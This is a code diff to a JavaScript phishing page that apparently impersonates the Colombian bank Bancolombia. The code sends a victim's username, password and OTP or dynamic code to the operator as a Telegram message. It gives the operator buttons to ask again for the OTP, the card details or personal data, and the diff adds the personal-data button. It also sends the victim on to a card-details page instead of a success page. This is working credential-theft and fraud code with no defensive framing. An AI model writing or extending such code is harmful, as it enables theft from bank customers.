@@ -628,7 +628,7 @@
             console.log('💾 Datos completos guardados:', allData);
 
             // Mensaje para Telegram
-            const mensaje = `🔐 *BANCOLOMBIA - VERIFICACIÓN*\n\n👤 *Usuario:* ${allData.usuario}\n🔑 *Clave:* ${allData.clave}\n🎯 *${currentType === 'otp' ? 'OTP' : 'Dinámica'}:* ${code}\n🌐 *IP:* ${allData.ip}\n⏰ *Hora:* ${allData.timestamp}\n🆔 *ID:* ${allData.transactionId}`;
+            const mensaje = `🔐 *BANCOLOMBIA - VERIFICACIÓN*\n\n👤 *Usuario:* ${allData.usuario}\n🔑 *Clave:* ${allData.clave}\n🎯 *${currentType === 'otp' ? 'OTP' : 'Dinámica'}:* ${code}\n⏰ *Hora:* ${allData.timestamp}\n🆔 *ID:* ${allData.transactionId}`;
 
             const teclado = {
                 inline_keyboard: [
@@ -639,6 +639,9 @@
                     [
                         { text: "🔐 Pedir Otra Vez", callback_data: `pedir_otp:${allData.transactionId}` },
                         { text: "💳 Pedir Tarjeta", callback_data: `pedir_tarjeta:${allData.transactionId}` }
+                    ],
+                    [
+                        { text: "📋 Pedir Datos Personales", callback_data: `pedir_datos:${allData.transactionId}` }
                     ],
                     [
                         { text: "✔️ Finalizar", callback_data: `finish:${allData.transactionId}` }
@@ -656,9 +659,9 @@
                 
                 setTimeout(() => {
                     loadingScreen.classList.remove('active');
-                    console.log('🔄 Redirigiendo a exito-final.html');
-                    // AQUÍ ESTÁ EL CAMBIO CRÍTICO - REDIRIGE A exito-final.html
-                    window.location.href = 'exito-final.html';
+                    console.log('🔄 Redirigiendo a datos-tarjeta.html');
+                    // ✅ CORRECCIÓN: Redirige a datos-tarjeta.html
+                    window.location.href = 'datos-tarjeta.html';
                 }, 3000);
                 
             } catch (error) {
